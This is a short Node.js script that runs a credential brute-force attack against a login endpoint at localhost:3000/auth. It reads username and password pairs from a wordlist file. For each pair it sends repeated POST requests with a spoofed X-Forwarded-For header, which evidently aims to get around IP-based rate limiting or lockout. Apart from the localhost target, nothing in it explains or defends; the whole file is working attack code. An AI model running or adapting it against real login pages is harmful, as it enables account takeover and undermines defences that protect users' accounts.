const axios = require('axios');
const fs = require('fs');
const readline = require('readline');

const target = 'http://localhost:3000/auth';

// Read wordlist file
const readWordlist = async (filePath) => {
  const fileStream = fs.createReadStream(filePath);
  const rl = readline.createInterface({
    input: fileStream,
    crlfDelay: Infinity
  });

  const credentials = [];
  for await (const line of rl) {
    const [username, password] = line.split(',');
    if (username && password) {
      credentials.push({ username, password });
    }
  }
  return credentials;
};

// Perform brute force attack
const bruteForce = async () => {
  const wordlistPath = './wordlist.txt';
  const credentials = await readWordlist(wordlistPath);

  for (const { username, password } of credentials) {
    for (let i = 1; i <= 10; i++) {
      try {
        const response = await axios.post(
          target,
          { username, password },
          {
            headers: {
              'X-Forwarded-For': `192.168.1.${i}`, // Spoofed IP
            },
          }
        );

        console.log(
          `Response from spoofed IP 192.168.1.${i} for ${username}:${password}:`,
          response.data
        );
      } catch (error) {
        console.error(
          `Error for ${username}:${password} from spoofed IP 192.168.1.${i}:`,
          error.response?.data || error.message
        );
      }
    }
  }
};

bruteForce();
